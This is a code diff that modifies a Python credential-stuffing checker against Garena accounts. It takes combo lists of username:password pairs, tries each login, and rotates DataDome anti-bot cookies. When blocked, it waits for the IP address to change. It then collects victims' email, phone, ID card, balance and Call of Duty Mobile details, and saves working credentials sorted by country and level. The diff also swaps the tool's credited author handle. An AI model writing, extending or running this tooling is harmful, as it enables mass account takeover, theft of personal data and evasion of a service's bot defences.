@@ -34,7 +34,7 @@ logger = logging.getLogger()
 handler = logging.StreamHandler()
 handler.setFormatter(ColoredFormatter())
 logger.addHandler(handler)
-logger.setLevel(logging.DEBUG)
+logger.setLevel(logging.INFO) 
 logging.getLogger("urllib3").setLevel(logging.ERROR)
 logging.getLogger("requests").setLevel(logging.ERROR)
 
@@ -79,7 +79,7 @@ class LiveStats:
         stats = self.get_stats()
         bright_blue = '\033[94m'
         reset_color = '\033[0m'
-        return f"{bright_blue}[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | HAS CODM [{stats['has_codm']}] | NO CODM [{stats['no_codm']}] -> config @poqruette{reset_color}"
+        return f"{bright_blue}[LIVE STATS] VALID [{stats['valid']}] | INVALID [{stats['invalid']}] | CLEAN [{stats['clean']}] | NOT CLEAN [{stats['not_clean']}] | HAS CODM [{stats['has_codm']}] | NO CODM [{stats['no_codm']}] -> config @ArchangelCrowley{reset_color}"
 
 class CookieManager:
     def __init__(self):
@@ -97,6 +97,10 @@ class CookieManager:
     def save_cookie(self, cookie):
         return True
 
+import socket
+import time
+import requests
+
 class DataDomeManager:
     def __init__(self):
         self.current_datadome = None
@@ -109,7 +113,6 @@ class DataDomeManager:
             self.datadome_history.append(datadome_cookie)
             if len(self.datadome_history) > 10:
                 self.datadome_history.pop(0)
-            logger.info(f"[𝙄𝙉𝙁𝙊] 𝘿𝘼𝙏𝘼𝘿𝙊𝙈𝙀 𝘾𝙊𝙊𝙆𝙄𝙀 𝙐𝙋𝘿𝘼𝙏𝙀𝘿!: {datadome_cookie[:30]}...")
             
     def get_datadome(self):
         return self.current_datadome
@@ -145,24 +148,87 @@ class DataDomeManager:
             logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
             return False
 
+    def get_current_ip(self):
+        """Get current public IP address with multiple fallback services"""
+        ip_services = [
+            'https://api.ipify.org',
+            'https://icanhazip.com',
+            'https://ident.me',
+            'https://checkip.amazonaws.com'
+        ]
+        
+        for service in ip_services:
+            try:
+                response = requests.get(service, timeout=10)
+                if response.status_code == 200:
+                    ip = response.text.strip()
+                    if ip and '.' in ip:  
+                        return ip
+            except Exception:
+                continue
+        
+        logger.warning(f"[WARNING] Could not fetch IP from any service")
+        return None
+
+    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=10):
+        """Wait for IP address to change AUTOMATICALLY"""
+        logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
+        
+        original_ip = self.get_current_ip()
+        if not original_ip:
+            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
+            time.sleep(10)
+            return True
+            
+        logger.info(f"[𝙄𝙉𝙁𝙊] Current IP: {original_ip}")
+        logger.info(f"[𝙄𝙉𝙁𝙊] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
+        
+        start_time = time.time()
+        attempts = 0
+        
+        while time.time() - start_time < max_wait_time:
+            attempts += 1
+            current_ip = self.get_current_ip()
+            
+            if current_ip and current_ip != original_ip:
+                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
+                logger.info(f"[𝙄𝙉𝙁𝙊] IP changed successfully after {attempts} checks!")
+                return True
+            else:
+                if attempts % 5 == 0:  
+                    logger.info(f"[𝙄𝙉𝙁𝙊] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
+                time.sleep(check_interval)
+        
+        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
+        return False
+
     def handle_403(self, session):
         self._403_attempts += 1
+        
+        
         if self._403_attempts >= 3:
             logger.error(f"[ERROR] IP blocked after 3 attempts.")
             logger.error(f"[𝙄𝙉𝙁𝙊] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
-            logger.info(f"[𝙄𝙉𝙁𝙊] Script PAUSED. Fix your network and press Enter to continue...")
+            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-detecting IP change...")
             
-            input()
             
-            logger.info(f"[𝙄𝙉𝙁𝙊] Auto-fetching new DataDome cookie...")
-            new_datadome = get_datadome_cookie(session)
-            if new_datadome:
-                self.set_datadome(new_datadome)
+            if self.wait_for_ip_change(session):
+                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
+                
+                
                 self._403_attempts = 0
-                logger.info(f"[SUCCESS] Auto-fetched new DataDome: {new_datadome[:30]}...")
-                return True
+                
+                
+                new_datadome = get_datadome_cookie(session)
+                if new_datadome:
+                    self.set_datadome(new_datadome)
+                    logger.info(f"[SUCCESS] New DataDome cookie obtained")
+                    return True
+                else:
+                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
+                    return False
             else:
-                logger.error(f"[ERROR] Failed to auto-fetch DataDome cookie")
+                logger.error(f"[ERROR] IP did not change, cannot continue")
                 return False
         return False
 
@@ -272,7 +338,7 @@ def get_datadome_cookie(session):
             except json.JSONDecodeError:
                 logger.error(f"[ERROR] Invalid JSON response from DataDome")
                 if attempt < retries - 1:
-                    time.sleep(0.5)
+                    time.sleep(2)
                     continue
                 return None
             
@@ -283,22 +349,22 @@ def get_datadome_cookie(session):
                 else:
                     datadome = cookie_string
                     
-                logger.info(f"[SUCCESS] 𝘿𝘿 𝘾𝙊𝙊𝙆𝙄𝙀 𝙁𝙊𝙐𝙉𝘿!!: {datadome[:30]}...")
+                logger.info(f"[SUCCESS] DataDome cookie found")
                 return datadome
             else:
                 logger.warning(f"[WARNING] DataDome cookie not found. Status: {response_json.get('status')}")
                 if attempt < retries - 1:
-                    time.sleep(0.5)
+                    time.sleep(2)
                     continue
                     
         except requests.exceptions.RequestException as e:
             logger.error(f"[ERROR] Error getting DataDome cookie (attempt {attempt + 1}): {e}")
             if attempt < retries - 1:
-                time.sleep(0.5)
+                time.sleep(2)
         except Exception as e:
             logger.error(f"[ERROR] Unexpected error getting DataDome cookie: {e}")
             if attempt < retries - 1:
-                time.sleep(0.5)
+                time.sleep(2)
     
     return None
 
@@ -311,11 +377,14 @@ def prelogin(session, account, datadome_manager):
         'id': str(int(time.time() * 1000))
     }
     
+    
     retries = 3
     for attempt in range(retries):
         try:
+            
             current_cookies = session.cookies.get_dict()
             cookie_parts = []
+            
             
             for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                 if cookie_name in current_cookies:
@@ -339,17 +408,21 @@ def prelogin(session, account, datadome_manager):
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
             }
             
+            
             if cookie_header:
                 headers['cookie'] = cookie_header
             
-            logger.info(f"[PRELOGIN] Attempt {attempt + 1} for {account} with cookies: {bool(cookie_header)}")
+            logger.info(f"[PRELOGIN] Attempt {attempt + 1}/{retries} for {account}")
             
             response = session.get(url, headers=headers, params=params, timeout=30)
             
+            
             new_cookies = {}
+            
             
             if 'set-cookie' in response.headers:
                 set_cookie_header = response.headers['set-cookie']
+                
                 for cookie_str in set_cookie_header.split(','):
                     if '=' in cookie_str:
                         try:
@@ -358,7 +431,9 @@ def prelogin(session, account, datadome_manager):
                             if cookie_name and cookie_value:
                                 new_cookies[cookie_name] = cookie_value
                         except Exception as e:
-                            logger.warning(f"[WARNING] Error parsing cookie from set-cookie: {e}")
+                            
+                            pass
+            
             
             try:
                 response_cookies = response.cookies.get_dict()
@@ -366,34 +441,37 @@ def prelogin(session, account, datadome_manager):
                     if cookie_name not in new_cookies:
                         new_cookies[cookie_name] = cookie_value
             except Exception as e:
-                logger.warning(f"[WARNING] Error extracting cookies from response: {e}")
+                
+                pass
+            
             
             for cookie_name, cookie_value in new_cookies.items():
                 if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                     session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                     if cookie_name == 'datadome':
                         datadome_manager.set_datadome(cookie_value)
-                        logger.info(f"[COOKIE] Updated DataDome: {cookie_value[:30]}...")
-                    elif cookie_name == 'apple_state_key':
-                        logger.info(f"[COOKIE] Updated apple_state_key: {cookie_value[:30]}...")
-                    elif cookie_name == 'sso_key':
-                        logger.info(f"[COOKIE] Updated sso_key: {cookie_value[:30]}...")
             
             new_datadome = new_cookies.get('datadome')
             
             if response.status_code == 403:
-                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1})")
+                logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
+                
                 
                 if new_cookies and attempt < retries - 1:
                     logger.info(f"[RETRY] Got new cookies from 403, retrying...")
-                    time.sleep(0.5)
+                    time.sleep(2)
                     continue
+                
                 
                 if datadome_manager.handle_403(session):
                     return "IP_BLOCKED", None, None
+                else:
+                    
+                    logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
+                    return None, None, new_datadome
                 
                 if attempt < retries - 1:
-                    time.sleep(0.5)
+                    time.sleep(2)
                     continue
                 return None, None, new_datadome
             
@@ -404,7 +482,7 @@ def prelogin(session, account, datadome_manager):
             except json.JSONDecodeError:
                 logger.error(f"[ERROR] Invalid JSON response from prelogin for {account}")
                 if attempt < retries - 1:
-                    time.sleep(0.5)
+                    time.sleep(2)
                     continue
                 return None, None, new_datadome
             
@@ -421,15 +499,13 @@ def prelogin(session, account, datadome_manager):
                 
             logger.info(f"[SUCCESS] Prelogin successful: {account}")
             
-            final_cookies = session.cookies.get_dict()
-            logger.debug(f"[DEBUG] Final cookies after prelogin: {list(final_cookies.keys())}")
-            
             return v1, v2, new_datadome
             
         except requests.exceptions.HTTPError as e:
             if hasattr(e, 'response') and e.response is not None:
                 if e.response.status_code == 403:
-                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1})")
+                    logger.error(f"[ERROR] 403 Forbidden during prelogin for {account} (attempt {attempt + 1}/{retries})")
+                    
                     
                     new_cookies = {}
                     if 'set-cookie' in e.response.headers:
@@ -445,32 +521,37 @@ def prelogin(session, account, datadome_manager):
                                         if cookie_name == 'datadome':
                                             datadome_manager.set_datadome(cookie_value)
                                 except Exception as ex:
-                                    logger.warning(f"[WARNING] Error extracting cookie from 403 error: {ex}")
+                                    
+                                    pass
                     
                     if new_cookies and attempt < retries - 1:
                         logger.info(f"[RETRY] Retrying with new cookies from 403...")
-                        time.sleep(0.5)
+                        time.sleep(2)
                         continue
+                    
                     
                     if datadome_manager.handle_403(session):
                         return "IP_BLOCKED", None, None
+                    else:
+                        logger.error(f"[ERROR] Cannot continue with {account} due to IP block")
+                        return None, None, new_cookies.get('datadome')
                         
                     if attempt < retries - 1:
-                        time.sleep(0.5)
+                        time.sleep(2)
                         continue
                     return None, None, new_cookies.get('datadome')
                 else:
-                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
+                    logger.error(f"[ERROR] HTTP error {e.response.status_code} fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
             else:
-                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
+                logger.error(f"[ERROR] HTTP error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
                 
             if attempt < retries - 1:
-                time.sleep(0.5)
+                time.sleep(2)
                 continue
         except Exception as e:
-            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}): {e}")
+            logger.error(f"[ERROR] Error fetching prelogin data for {account} (attempt {attempt + 1}/{retries}): {e}")
             if attempt < retries - 1:
-                time.sleep(0.5)
+                time.sleep(2)
                 
     return None, None, None
 
@@ -486,6 +567,7 @@ def login(session, account, password, v1, v2):
         'id': str(int(time.time() * 1000))
     }
     
+    
     current_cookies = session.cookies.get_dict()
     cookie_parts = []
     for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
@@ -499,6 +581,7 @@ def login(session, account, password, v1, v2):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
     }
     
+    
     if cookie_header:
         headers['cookie'] = cookie_header
     
@@ -508,7 +591,9 @@ def login(session, account, password, v1, v2):
             response = session.get(url, headers=headers, params=params, timeout=30)
             response.raise_for_status()
             
+            
             login_cookies = {}
+            
             
             if 'set-cookie' in response.headers:
                 set_cookie_header = response.headers['set-cookie']
@@ -520,7 +605,9 @@ def login(session, account, password, v1, v2):
                             if cookie_name and cookie_value:
                                 login_cookies[cookie_name] = cookie_value
                         except Exception as e:
-                            logger.warning(f"[WARNING] Error parsing cookie from login response: {e}")
+                            
+                            pass
+            
             
             try:
                 response_cookies = response.cookies.get_dict()
@@ -528,22 +615,20 @@ def login(session, account, password, v1, v2):
                     if cookie_name not in login_cookies:
                         login_cookies[cookie_name] = cookie_value
             except Exception as e:
-                logger.warning(f"[WARNING] Error extracting cookies from login response: {e}")
+                
+                pass
+            
             
             for cookie_name, cookie_value in login_cookies.items():
                 if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                     session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
-                    if cookie_name == 'sso_key':
-                        logger.info(f"[COOKIE] Login set sso_key: {cookie_value[:30]}...")
-                    elif cookie_name == 'apple_state_key':
-                        logger.info(f"[COOKIE] Login updated apple_state_key: {cookie_value[:30]}...")
             
             try:
                 data = response.json()
             except json.JSONDecodeError:
                 logger.error(f"[ERROR] Invalid JSON response from login for {account}")
                 if attempt < retries - 1:
-                    time.sleep(0.5)
+                    time.sleep(2)
                     continue
                 return None
             
@@ -553,7 +638,7 @@ def login(session, account, password, v1, v2):
                 error_msg = data['error']
                 logger.error(f"[ERROR] Login failed for {account}: {error_msg}")
                 
-                if error_msg == 'error_auth':
+                if error_msg == 'ACCOUNT DOESNT EXIST':
                     logger.warning(f"[WARNING] Authentication error - likely invalid credentials for {account}")
                     return None
                 elif 'captcha' in error_msg.lower():
@@ -561,13 +646,13 @@ def login(session, account, password, v1, v2):
                     time.sleep(3)
                     continue
                     
-            logger.info(f"[SUCCESS] Logged in: {account}")
+            # logger.info(f"[SUCCESS] Logged in: {account}")
             return sso_key
             
         except requests.RequestException as e:
             logger.error(f"[ERROR] Login request failed for {account} (attempt {attempt + 1}): {e}")
             if attempt < retries - 1:
-                time.sleep(0.5)
+                time.sleep(2)
                 
     return None
 
@@ -688,6 +773,48 @@ def get_codm_user_info(session, token):
         logger.error(f"[ERROR] Error getting CODM user info: {e}")
         return {}
 
+def get_codm_user_info(session, token):
+    try:
+        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
+        check_headers = {
+            "authority": "api-delete-request.codm.garena.co.id",
+            "accept": "application/json, text/plain, */*",
+            "accept-language": "en-US,en;q=0.9",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "cache-control": "no-cache",
+            "codm-delete-token": token,
+            "origin": "https://delete-request.codm.garena.co.id",
+            "pragma": "no-cache",
+            "referer": "https://delete-request.codm.garena.co.id/",
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+            "x-requested-with": "XMLHttpRequest"
+        }
+        
+        check_response = session.get(check_login_url, headers=check_headers)
+        check_data = check_response.json()
+        
+        user_data = check_data.get("user", {})
+        if user_data:
+            return {
+                "codm_nickname": user_data.get("codm_nickname", "N/A"),
+                "codm_level": user_data.get("codm_level", "N/A"),
+                "region": user_data.get("region", "N/A"),
+                "uid": user_data.get("uid", "N/A"),
+                "open_id": user_data.get("open_id", "N/A"),
+                "t_open_id": user_data.get("t_open_id", "N/A")
+            }
+        return {}
+        
+    except Exception as e:
+        logger.error(f"❌ Error getting CODM user info: {e}")
+        return {}
+
 def check_codm_account(session, account):
     codm_info = {}
     has_codm = False
@@ -695,62 +822,165 @@ def check_codm_account(session, account):
     try:
         access_token = get_codm_access_token(session)
         if not access_token:
-            logger.warning(f"[WARNING] No CODM access token for {account}")
+            logger.warning(f"⚠️ No CODM access token for {account}")
             return has_codm, codm_info
         
         codm_token, status = process_codm_callback(session, access_token)
         
         if status == "no_codm":
-            logger.info(f"[INFO] No CODM detected for {account}")
+            logger.info(f"⚠️ No CODM detected for {account}")
             return has_codm, codm_info
         elif status != "success" or not codm_token:
-            logger.warning(f"[WARNING] CODM callback failed for {account}: {status}")
+            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
             return has_codm, codm_info
         
         codm_info = get_codm_user_info(session, codm_token)
         if codm_info:
             has_codm = True
-            logger.info(f"[SUCCESS] CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
+            logger.info(f"✅ CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
             
     except Exception as e:
-        logger.error(f"[ERROR] Error checking CODM for {account}: {e}")
+        logger.error(f"❌ Error checking CODM for {account}: {e}")
     
     return has_codm, codm_info
-
-def display_codm_info(account, codm_info):
+    
+def display_codm_info(account_details, codm_info):
     if not codm_info:
         return ""
     
-    display_text = f" | CODM: {codm_info.get('codm_nickname', 'N/A')} (Level {codm_info.get('codm_level', 'N/A')})"
     
-    region = codm_info.get('region', '')
-    if region and region != 'N/A':
-        display_text += f" [{region.upper()}]"
+    if isinstance(account_details, str):
+            
+        account_details = {
+            'username': account_details,
+            'nickname': 'N/A',
+            'email': account_details,
+            'personal': {
+                'mobile_no': 'N/A',
+                'country': 'N/A',
+                'id_card': 'N/A'
+            },
+            'bind_status': 'N/A',
+            'security_status': 'N/A',
+            'profile': {
+                'shell_balance': 'N/A'
+            },
+            'status': {
+                'account_status': 'N/A'
+            },
+            'game_info': []
+        }
+    
+    display_text = f"┌─ Username: {account_details.get('username', 'N/A')}\n"
+    display_text += f"├─ Nickname: {account_details.get('nickname', 'N/A')}\n"
+    display_text += f"├─ Email: {account_details.get('email', 'N/A')}\n"
+    display_text += f"├─ Phone: {account_details['personal'].get('mobile_no', 'N/A')}\n"
+    display_text += f"├─ Country: {account_details['personal'].get('country', 'N/A')}\n"
+    display_text += f"├─ ID Card: {account_details['personal'].get('id_card', 'N/A')}\n"
+    display_text += f"├─ Bind Status: {account_details.get('bind_status', 'N/A')}\n"
+    display_text += f"├─ Security: {account_details.get('security_status', 'N/A')}\n"
+    display_text += f"├─ Shell Balance: {account_details['profile'].get('shell_balance', 'N/A')}\n"
+    display_text += f"├─ Account Status: {account_details['status'].get('account_status', 'N/A')}\n"
+    display_text += "├─ CODM INFO:\n"
+    display_text += f"│  ├─ Nickname: {codm_info.get('codm_nickname', 'N/A')}\n"
+    display_text += f"│  ├─ Level: {codm_info.get('codm_level', 'N/A')}\n"
+    display_text += f"│  ├─ Region: {codm_info.get('region', 'N/A')}\n"
+    display_text += f"│  └─ UID: {codm_info.get('uid', 'N/A')}\n"
     
     return display_text
 
-def save_codm_accounts(account, password, codm_info, is_clean):
+def save_codm_account(account, password, codm_info, country='N/A'):
     try:
         if not codm_info:
             return
             
-        codm_nickname = codm_info.get('codm_nickname', 'N/A')
-        codm_level = codm_info.get('codm_level', 'N/A')
-        codm_uid = codm_info.get('uid', 'N/A')
-        shells = "unknown"
-
-        notclean_format = f"Account: {account}:{password} | Binds: {'connected' if not is_clean else 'bounds'} | CODM Nickname: {codm_nickname} | CODM Level: {codm_level} | CODM UID: {codm_uid} | Shells: {shells}"
-        clean_format = f"Account: {account}:{password} | CODM Nickname: {codm_nickname} | CODM Level: {codm_level} | CODM UID: {codm_uid} | Shells: {shells}"
-
-        if not is_clean:
-            with open('notclean_codm.txt', 'a', encoding='utf-8') as f:
-                f.write(notclean_format + '\n')
+        codm_level = int(codm_info.get('codm_level', 0))
+        region = codm_info.get('region', 'N/A').upper()
+        nickname = codm_info.get('codm_nickname', 'N/A')
+        
+        if isinstance(country, dict):
+            country_code = country.get('country', 'N/A').upper() if country.get('country') else region
         else:
-            with open('clean_codm.txt', 'a', encoding='utf-8') as f:
-                f.write(clean_format + '\n')
-                
+            country_code = country.upper() if country and country != 'N/A' else region
+            
+        if country_code == 'N/A':
+            country_code = 'UNKNOWN'
+
+        if codm_level <= 50:
+            level_range = "1-50"
+        elif codm_level <= 100:
+            level_range = "51-100"
+        elif codm_level <= 150:
+            level_range = "101-150"
+        elif codm_level <= 200:
+            level_range = "151-200"
+        elif codm_level <= 250:
+            level_range = "201-250"
+        elif codm_level <= 300:
+            level_range = "251-300"
+        elif codm_level <= 350:
+            level_range = "301-350"
+        else:
+            level_range = "351-400"
+
+        os.makedirs('Results', exist_ok=True)
+        level_file = os.path.join('Results', f"{country_code}_{level_range}_accounts.txt")
+        
+        account_exists = False
+        if os.path.exists(level_file):
+            with open(level_file, "r", encoding="utf-8") as f:
+                existing_content = f.read()
+                if account in existing_content:
+                    account_exists = True
+        
+        if not account_exists:
+            with open(level_file, "a", encoding="utf-8") as f:
+                if account and password:
+                    f.write(f"{account}:{password} | Level: {codm_level} | Nickname: {nickname} | Region: {region} | UID: {codm_info.get('uid', 'N/A')}\n")
+                    logger.info(f"[SUCCESS] Saved CODM account: {account} (Level {codm_level}, Country: {country_code}, Range: {level_range})")
+                else:
+                    logger.info(f"[INFO] Skipping CODM save for {account}: missing account or password")
+        else:
+            logger.info(f"[INFO] CODM account {account} already exists in {level_file}, skipping duplicate\n")
+            
     except Exception as e:
-        logger.error(f"[ERROR] Error saving CODM accounts: {e}")
+        logger.error(f"[ERROR] Error saving CODM account {account}: {e}")
+
+def save_account_details(account, details, codm_info=None, password=None):
+    try:
+        os.makedirs('Results', exist_ok=True)
+        
+        codm_name = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
+        codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
+        codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
+        codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
+        shell_balance = details['profile']['shell_balance']
+        country = details['personal']['country']
+
+        if codm_info:
+            save_codm_account(account, password, codm_info, country)
+        
+        with open('Results/full_details.txt', 'a', encoding='utf-8') as f:
+            f.write("=" * 60 + "\n")
+            f.write(f"Account: {account}\n")
+            f.write(f"Password: {password}\n")  
+            f.write(f"UID: {details['uid']}\n")
+            f.write(f"Username: {details['username']}\n")
+            f.write(f"Nickname: {details['nickname']}\n")
+            f.write(f"Email: {details['email']}\n")
+            f.write(f"Phone: {details['personal']['mobile_no']}\n")
+            f.write(f"Country: {country}\n")
+            f.write(f"Shell Balance: {shell_balance}\n")
+            f.write(f"Account Status: {details['status']['account_status']}\n")
+            if codm_info:
+                f.write(f"CODM Name: {codm_name}\n")
+                f.write(f"CODM UID: {codm_uid}\n")
+                f.write(f"CODM Region: {codm_region}\n")
+                f.write(f"CODM Level: {codm_level}\n")
+            f.write("=" * 60 + "\n\n")
+            
+    except Exception as e:
+        logger.error(f"[ERROR] Error saving account details: {e}")
 
 def parse_account_details(data):
     user_info = data.get('user_info', {})
@@ -832,31 +1062,23 @@ def parse_account_details(data):
 
 def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats):
     try:
-        logger.info(f"[COOKIE] Initializing cookies for {account}")
-        
-        current_cookies = session.cookies.get_dict()
-        logger.debug(f"[DEBUG] Initial cookies: {list(current_cookies.keys())}")
         
         datadome_manager.clear_session_datadome(session)
         
         current_datadome = datadome_manager.get_datadome()
         if current_datadome:
             success = datadome_manager.set_session_datadome(session, current_datadome)
-            if success:
-                logger.info(f"[COOKIE] Using existing DataDome: {current_datadome[:30]}...")
-            else:
+            if not success:
                 logger.warning(f"[WARNING] Failed to set existing DataDome cookie")
         else:
+            
             datadome = get_datadome_cookie(session)
             if not datadome:
                 logger.warning(f"[WARNING] DataDome generation failed, proceeding without it")
             else:
                 datadome_manager.set_datadome(datadome)
                 datadome_manager.set_session_datadome(session, datadome)
-                logger.info(f"[COOKIE] Generated new DataDome: {datadome[:30]}...")
         
-        final_cookies = session.cookies.get_dict()
-        logger.debug(f"[DEBUG] Cookies before prelogin: {list(final_cookies.keys())}")
         
         v1, v2, new_datadome = prelogin(session, account, datadome_manager)
         
@@ -870,13 +1092,13 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         if new_datadome:
             datadome_manager.set_datadome(new_datadome)
             datadome_manager.set_session_datadome(session, new_datadome)
-            logger.info(f"[𝙄𝙉𝙁𝙊] Updated DataDome from prelogin: {new_datadome[:30]}...")
         
         sso_key = login(session, account, password, v1, v2)
         if not sso_key:
             live_stats.update_stats(valid=False)
             return f"[ERROR] {account}: Invalid (Login failed)"
         
+       
         current_cookies = session.cookies.get_dict()
         cookie_parts = []
         for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
@@ -889,6 +1111,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             'referer': 'https://account.garena.com/',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
         }
+        
         
         if cookie_header:
             headers['cookie'] = cookie_header
@@ -909,7 +1132,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             return f"[ERROR] {account}: Invalid response from server"
         
         if 'error' in account_data:
-            if account_data.get('error') == 'error_auth':
+            if account_data.get('error') == 'ACCOUNT DOESNT EXIST':
                 live_stats.update_stats(valid=False)
                 return f"[WARNING] {account}: Invalid (Authentication error)"
             live_stats.update_stats(valid=False)
@@ -920,25 +1143,25 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         else:
             details = parse_account_details({'user_info': account_data})
         
+        
+        
         has_codm, codm_info = check_codm_account(session, account)
         
         fresh_datadome = datadome_manager.extract_datadome_from_session(session)
         if fresh_datadome:
             cookie_manager.save_cookie(fresh_datadome)
-            logger.info(f"[𝙄𝙉𝙁𝙊] Fresh cookie obtained for next account")
         
-        if has_codm:
-            save_codm_accounts(account, password, codm_info, details['is_clean'])
+        save_account_details(account, details, codm_info if has_codm else None, password)
         
         live_stats.update_stats(valid=True, clean=details['is_clean'], has_codm=has_codm)
         
         shell_balance = details['profile']['shell_balance']
         bind_status_display = "[CLEAN]" if details['is_clean'] else f"[BOUND]"
         
-        result = f"[SUCCESS] {account}:{password} | {bind_status_display} | {details['security_status']} | {details['uid']} | {details['nickname']} | {details['email']} | {details['personal']['mobile_no']} | {details['personal']['country']} | {shell_balance} SHELL"
+        result = f"[SUCCESS] {account}: Valid\n"
         
         if has_codm:
-            result += display_codm_info(account, codm_info)
+            result += display_codm_info(details, codm_info)
         
         return result
         
@@ -972,8 +1195,37 @@ def main():
             datadome_manager.set_datadome(datadome)
             logger.info(f"[𝙄𝙉𝙁𝙊] Generated initial DataDome cookie")
     
-    with open(filename, 'r', encoding='utf-8') as file:
-        accounts = [line.strip() for line in file if line.strip()]
+    
+    accounts = []
+    encodings_to_try = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
+    
+    for encoding in encodings_to_try:
+        try:
+            with open(filename, 'r', encoding=encoding) as file:
+                accounts = [line.strip() for line in file if line.strip()]
+            logger.info(f"[SUCCESS] File loaded with {encoding} encoding")
+            break
+        except UnicodeDecodeError:
+            logger.warning(f"[WARNING] Failed to read with {encoding} encoding, trying next...")
+            continue
+        except Exception as e:
+            logger.error(f"[ERROR] Error reading file with {encoding}: {e}")
+            continue
+    
+    
+    if not accounts:
+        try:
+            logger.info(f"[INFO] Trying with error handling...")
+            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
+                accounts = [line.strip() for line in file if line.strip()]
+            logger.info(f"[SUCCESS] File loaded with error handling")
+        except Exception as e:
+            logger.error(f"[ERROR] Could not read file with any encoding: {e}")
+            return
+    
+    if not accounts:
+        logger.error(f"[ERROR] No accounts found in file '{filename}'")
+        return
     
     logger.info(f"[𝙄𝙉𝙁𝙊] Total accounts to process: {len(accounts)}")
     
@@ -982,22 +1234,32 @@ def main():
             logger.warning(f"[WARNING] Skipping invalid account line: {account_line}")
             continue
             
-        account, password = account_line.split(':', 1)
-        account = account.strip()
-        password = password.strip()
-        
-        logger.info(f"[𝙄𝙉𝙁𝙊] Processing {i}/{len(accounts)}: {account}... ")
-        
-        result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
-        logger.info(result)
-        
-        print(f"\n{live_stats.display_stats()}", flush=True)
-        
-        time.sleep(1)
+        try:
+            account, password = account_line.split(':', 1)
+            account = account.strip()
+            password = password.strip()
+            
+            logger.info(f"[𝙄𝙉𝙁𝙊] Processing {i}/{len(accounts)}: {account}... ")
+            
+            result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
+            logger.info(result)
+            
+            print(f"\n{live_stats.display_stats()}", flush=True)
+            
+            
+            
+        except Exception as e:
+            logger.error(f"[ERROR] Error processing account line {i}: {e}")
+            continue
     
     final_stats = live_stats.get_stats()
     print()
-    logger.info(f"[FINAL STATS] VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']} | CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']} | HAS CODM: {final_stats['has_codm']} | NO CODM: {final_stats['no_codm']} -> config @poqruette")
+    logger.info(f"[FINAL STATS] VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']} | CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']} | HAS CODM: {final_stats['has_codm']} | NO CODM: {final_stats['no_codm']} -> config @ArchangelCrowley")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        logger.info(f"[INFO] Script terminated by user")
+    except Exception as e:
+        logger.error(f"[ERROR] Unexpected error in main: {e}")
